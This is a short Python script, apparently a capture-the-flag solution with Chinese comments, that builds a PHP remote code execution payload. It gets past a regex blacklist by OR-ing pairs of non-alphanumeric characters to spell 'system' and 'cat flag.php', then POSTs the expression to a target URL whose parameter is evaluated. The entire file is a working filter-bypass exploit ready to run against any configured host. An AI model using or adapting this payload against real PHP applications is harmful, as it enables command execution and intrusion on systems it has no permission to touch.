import re
import requests

url="放入目标http"

a=[]
ans1=""
ans2=""
for i in range(0,256):
    c=chr(i)
    tmp = re.match(r'[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-',c, re.I)
    if(tmp):
        continue
        #print(tmp.group(0))
    else:
        a.append(i)

# eval("echo($c);");
mya="system"  #函数名 这里修改！
myb="cat flag.php"      #参数
def myfun(k,my):
    global ans1
    global ans2
    for i in range (0,len(a)):
        for j in range(i,len(a)):
            if(a[i]|a[j]==ord(my[k])):
                ans1+=chr(a[i])
                ans2+=chr(a[j])
                return;
for k in range(0,len(mya)):
    myfun(k,mya)
data1="(\""+ans1+"\"|\""+ans2+"\")"
ans1=""
ans2=""
for k in range(0,len(myb)):
    myfun(k,myb)
data2="(\""+ans1+"\"|\""+ans2+"\")"
data={"c":data1+data2}
print(data)
r=requests.post(url=url,data=data)
print(r.text)